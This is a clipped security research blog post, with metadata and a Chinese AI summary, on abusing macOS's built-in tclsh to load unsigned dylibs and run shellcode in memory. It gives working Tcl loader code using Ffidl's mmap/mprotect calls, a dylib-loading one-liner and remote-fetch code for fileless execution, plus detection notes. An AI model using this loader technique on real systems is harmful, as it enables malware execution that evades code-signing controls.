---
title: Abusing tclsh to Load (Remote) Shellcode on macOS
source: https://codecolor.ist/posts/2025-10-31-macos-abuse-tcl-lol/
source_host: codecolor.ist
clip_date: 2026-09-30T10:24:47+08:00
trace_id: 6ebf0e43-4141-4e6b-975d-70af4b008155
content_hash: 2a05df60fa8bf50442af35e0bd5f6c970cc4a79f41af4d65927ed796a0c01201
status: synced
tags:
  - macOS逆向
  - Shellcode加载
series: null
feed_source: CodeColorist·iOS/逆向
ai_summary: macOS 自带的 tclsh8.5 同时持有允许未签名可执行内存与禁用库验证两项 entitlement，配合预装 Ffidl 可在纯内存中下载并执行 shellcode，无需落盘。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3eb75244-d011-8100-90df-ceadc16c88f1
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> macOS 自带的 tclsh8.5 同时持有允许未签名可执行内存与禁用库验证两项 entitlement，配合预装 Ffidl 可在纯内存中下载并执行 shellcode，无需落盘。
> 
> - **entitlement 来源：** 对 Tahoe 的 entitlement 数据库查询显示 `com.apple.security.cs.allow-unsigned-executable-memory` 授予 `Tcl.framework/.../tclsh8.5`、`Wish` 等；tclsh 还额外拥有 `disable-library-validation`，可加载未经签名的 dylib。
> - **最简加载方式：** `echo "load bad.dylib" | tclsh`（LOOBins 已有示例），把 payload 当插件载入。
> - **原生调用链：** 系统预装 `/System/Library/Tcl/8.5/Ffidl0.6.1`，用 `::ffidl::callout` 加 `ffidl::symbol` 绑定 libSystem 的 `mmap` / `_platform_memmove` / `mprotect`，再 callout 指向缓冲区实现跳转执行；关键常量为 `PROT_READ|PROT_WRITE=3`、`MAP_ANONYMOUS|MAP_PRIVATE=4098`、`PROT_READ|PROT_EXEC=5`。
> - **远程投递：** Tcl 自带 `http` 与 `tls`，`::http::register https 443 ::tls::socket` 后 `::http::geturl` 取回 `state(body)`，可全内存下载执行并再叠加一层反射加载器。
> - **检测与限制：** 可用 Endpoint Security 的 `es_event_mprotect_t`、`es_event_mmap_t` 事件监控；但 XNU `mach_loader.c` 的 `hardening_exceptions` 硬编码 `com.tcltk.tclsh` 等脚本引擎名，使其运行在 keys-off 模式，无法用于签名代码指针（LPE 场景受限）。

## Background

I have collected macOS entitlement databases from OS X Lion (10.7) to macOS Tahoe and now host them on [https://codecolor.ist/entdb/](https://codecolor.ist/entdb/).

Here are the results for `com.apple.security.cs.allow-unsigned-executable-memory` on macOS Tahoe. With this entitlement, it is possible to use classic `mprotect` to map shellcode.

```swift
/System/Library/Frameworks
    /AudioToolbox.framework/XPCServices
        /AUHostingServiceXPC.xpc/Contents/MacOS/AUHostingServiceXPC
        /AUHostingServiceXPC_arrow.xpc/Contents/MacOS/AUHostingServiceXPC_arrow
        /com.apple.audio.InfoHelper.xpc/Contents/MacOS/com.apple.audio.InfoHelper
    /Tcl.framework/Versions/8.5/tclsh8.5
    /Tk.framework/Versions/8.5/Resources/Wish.app/Contents/MacOS/Wish
/usr/bin/auvaltool
```

Python 2 was marked deprecated and finally removed from macOS preinstalled binaries. However in terms of abuse, this `tclsh` is way more interesting than it. In addition to unsigned executable memory, it is also granted `com.apple.security.cs.disable-library-validation` that can load dylib without codesign enforcement.

[LOOBins](https://github.com/infosecB/LOOBins) already showed an example to load payload as plugins.

`echo "load bad.dylib" | tclsh`

## Shellcode Loader

On macOS, Tcl comes with Ffidl preinstalled, which is an ffi library. In other words, we can execute arbitrary native calls.

```
~ ls /System/Library/Tcl/8.5/ | grep Ffidl
Ffidl0.6.1
```

Here is an example of putting 1024 `0x41` bytes as shellcode and execute them. Of course the program will crash for unknown instructions.

```php
package require Ffidl

::ffidl::callout memcpy {{unsigned long long} {pointer-byte} {unsigned long}} {long long} [ffidl::symbol /usr/lib/libSystem.B.dylib _platform_memmove]
::ffidl::callout mmap {{int} {unsigned long long} {int} {int} {int} {int}} {unsigned long long} [ffidl::symbol /usr/lib/libSystem.B.dylib mmap]
::ffidl::callout mprotect {{unsigned long long} {unsigned long} {int}} {int} [ffidl::symbol /usr/lib/libSystem.B.dylib mprotect]

binary scan [string repeat "\x41" 1024] a* shellcode
set len [string length $shellcode]

# PROT_READ | PROT_WRITE == 3
# MAP_ANONYMOUS | MAP_PRIVATE == 4098
set buf [mmap 0 16384 3 4098 -1 0]

set ignore [memcpy $buf $shellcode $len]

# PROT_READ | PROT_EXEC == 5
set ignore [mprotect $buf 16384 5]

::ffidl::callout lol {int} {int} $buf

# jump to shellcode
lol 0
```

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0bcb4e0a9839e45c.svg)

## Remote Payload

Tcl on macOS also ships with [http](https://wiki.tcl-lang.org/page/http) and [tls](https://wiki.tcl-lang.org/page/tls) packages. Very useful to download resource from remote URL.

```php
package require http
package require tls

::http::register https 443 ::tls::socket

set url "https://www.example.com/"
set req [::http::geturl $url]

upvar #0 $req state
puts $state(body)
```

Putting all together we can use this genuine system binary to download and execute shellcode without dropping anything on disk, and even chain one more reflective loader on top of it.

## Detection

There are already [es_event_mprotect_t](https://developer.apple.com/documentation/endpointsecurity/es_event_mprotect_t) and [es_event_mmap_t](https://developer.apple.com/documentation/endpointsecurity/es_event_mmap_t) events in [Endpoint Security](https://developer.apple.com/documentation/endpointsecurity) API.

## PAC?

Unfortunately we cannot use it to sign code pointers (for LPE exploitation). There are few hardcoded bundle names in XNU source code that will not get PAC key enabled.

[xnu/bsd/kern/mach_loader.c](https://github.com/apple-oss-distributions/xnu/blob/f6217f891ac0bb64f3d375211650a4c1ff8ca1ea/bsd/kern/mach_loader.c#L618)

```cpp
/* From /System/Library/Security/HardeningExceptions.plist */
const char *const hardening_exceptions[] = {
    "com.apple.perl5", /* Scripting engines may load third party code and jit*/
    "com.apple.perl", /* Scripting engines may load third party code and jit*/
    "org.python.python", /* Scripting engines may load third party code and jit*/
    "com.apple.expect", /* Scripting engines may load third party code and jit*/
    "com.tcltk.wish", /* Scripting engines may load third party code and jit*/
    "com.tcltk.tclsh", /* Scripting engines may load third party code and jit*/
    "com.apple.ruby", /* Scripting engines may load third party code and jit*/
    "com.apple.bash", /* Required for the 'enable' command */
    "com.apple.zsh", /* Required for the 'zmodload' command */
    "com.apple.ksh", /* Required for 'builtin' command */
    "com.apple.sh", /* rdar://138353488: sh re-execs into zsh or bash, which are exempted */
};
for (size_t i = 0; i < ARRAY_COUNT(hardening_exceptions); i++) {
    if (strncmp(hardening_exceptions[i], identity, strlen(hardening_exceptions[i])) == 0) {
        proc_t p = vfs_context_proc(imgp->ip_vfs_context);
        set_proc_name(imgp, p);
        os_log(OS_LOG_DEFAULT, "%s: running binary \"%s\" in keys-off mode due to identity: %s", __func__, p->p_name, identity);
        return true;
    }
}
```

Should've wrapped this to another OBTS talk...
